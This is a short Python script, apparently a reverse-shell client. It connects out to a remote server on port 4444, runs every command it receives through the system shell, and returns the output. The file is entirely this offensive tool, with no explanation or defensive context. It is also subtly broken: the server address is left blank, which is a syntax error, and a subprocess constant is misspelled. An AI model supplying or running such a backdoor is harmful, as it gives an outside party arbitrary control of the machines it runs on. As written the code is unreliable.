import sys
import socket
import subprocess

SERVER_IP =
PORT = 4444

s = socket.socket()
s.connect((SERVER_IP, PORT))
msg = s.recv(1024).decode()
print('[*] server:', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] received command: {cmd}')
    if cmd.lower() in ['q','quit', 'x', 'x']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.SRDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed'.encode()

    s.send(result)

s.close()